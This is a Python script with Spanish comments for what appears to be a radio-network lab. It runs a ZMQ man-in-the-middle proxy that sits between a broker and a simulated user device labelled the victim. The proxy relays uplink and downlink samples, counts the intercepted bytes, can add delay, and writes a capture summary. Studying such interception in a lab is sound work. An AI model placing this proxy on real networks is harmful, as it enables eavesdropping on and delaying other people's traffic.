#!/usr/bin/env python3
"""
Intermediario ZMQ (man-in-the-middle a nivel de aplicacion).

Se coloca en el canal ZMQ entre el broker y UE3: el broker, en vez de conectar
con UE3 directamente, conecta con este proxy, que reenvia a UE3 y viceversa.
Es el punto de insercion CORRECTO en este laboratorio: el emparejamiento del
enlace radio lo decide la configuracion ZMQ, no la capa de red (por eso el ARP
spoofing no sirve para interceptar aqui, solo para cortar).

El proxy:
  - INTERCEPTA: cuenta y puede volcar lo que pasa (prueba del espionaje),
  - RETARDA: retiene las muestras un tiempo (la huella del salto extra),
  - REENVIA: entrega a su destino (la victima conserva el servicio).

Reutiliza el patron del broker del laboratorio. Habla REQ/REP en ambos lados,
igual que srsUE y la DU, de modo que no rompe el enlace.

Variables de entorno:
  UE_ADDR         IP de UE3                              (10.0.0.32)
  UE_TX_PORT      puerto donde UE3 transmite (UL)        (2301)
  UE_RX_PORT      puerto donde UE3 recibe (DL)           (2300)
  BROKER_ADDR     IP del broker                          (10.0.0.35)
  DELAY_MS        retardo anadido por sentido, en ms     (0)
  CAPTURA         fichero de resumen interceptado        (vacio = no)
"""
import os, sys, time, signal, threading, collections
import zmq


def log(m): print(m, flush=True)


class Rama:
    """Un sentido: recibe de 'connect_addr', retiene, sirve en 'bind_addr'."""
    def __init__(self, ctx, nombre, bind_addr, connect_addr, delay_ms, stats):
        self.nombre = nombre
        self.delay = delay_ms / 1000.0
        self.stats = stats
        self.rep = ctx.socket(zmq.REP); self.rep.bind(bind_addr)
        self.req = ctx.socket(zmq.REQ); self.req.connect(connect_addr)
        log(f"  [{nombre}] sirve en {bind_addr}  <-  pide a {connect_addr}"
            f"  (retardo {delay_ms} ms)")

    def run(self, parar):
        while not parar.is_set():
            try:
                if self.rep.poll(100) == 0:
                    continue
                self.rep.recv()
                self.req.send(b'')
                datos = self.req.recv()
                self.stats[self.nombre + '_b'] += len(datos)
                self.stats[self.nombre + '_m'] += 1
                if self.delay > 0:
                    time.sleep(self.delay)
                self.rep.send(datos)
            except zmq.ZMQError:
                if not parar.is_set():
                    log(f"  [{self.nombre}] socket cerrado")
                break


def main():
    ue = os.environ.get("UE_ADDR", "10.0.0.32")
    ue_tx = os.environ.get("UE_TX_PORT", "2301")
    ue_rx = os.environ.get("UE_RX_PORT", "2300")
    br = os.environ.get("BROKER_ADDR", "10.0.0.35")
    delay = float(os.environ.get("DELAY_MS", "0"))
    captura = os.environ.get("CAPTURA", "")

    log("Intermediario ZMQ (MitM de aplicacion) en marcha")
    log(f"  Victima: UE3 ({ue})   retardo: {delay} ms/sentido")

    stats = collections.defaultdict(int)
    ctx = zmq.Context()
    parar = threading.Event()

    # SUBIDA: el broker pide muestras de UE3; se las servimos tras pedirselas
    #   broker --pide--> [REP del proxy en *:ue_tx] ... [REQ] --pide--> UE3
    ul = Rama(ctx, "UL", f"tcp://0.0.0.0:{ue_tx}", f"tcp://{ue}:{ue_tx}", delay, stats)
    # BAJADA: UE3 pide muestras; se las servimos tras pedirselas al broker
    dl = Rama(ctx, "DL", f"tcp://0.0.0.0:{ue_rx}", f"tcp://{br}:{ue_rx}", delay, stats)

    hilos = [threading.Thread(target=r.run, args=(parar,), daemon=True) for r in (ul, dl)]
    for h in hilos: h.start()

    def cerrar(sig, frame):
        log("\nDeteniendo el intermediario...")
        parar.set(); time.sleep(0.5)
        if captura:
            with open(captura, "w") as f:
                f.write("sentido,mensajes,bytes\n")
                f.write(f"subida,{stats['UL_m']},{stats['UL_b']}\n")
                f.write(f"bajada,{stats['DL_m']},{stats['DL_b']}\n")
            log(f"Resumen interceptado en {captura}")
        log(f"Interceptado: UL {stats['UL_b']} B, DL {stats['DL_b']} B")
        sys.exit(0)

    signal.signal(signal.SIGINT, cerrar)
    signal.signal(signal.SIGTERM, cerrar)
    log("Interceptando. UE3 cree hablar con el broker.")
    while not parar.is_set():
        time.sleep(10)
        log(f"  interceptado: UL {stats['UL_b']//1024} KB, DL {stats['DL_b']//1024} KB")


if __name__ == "__main__":
    main()
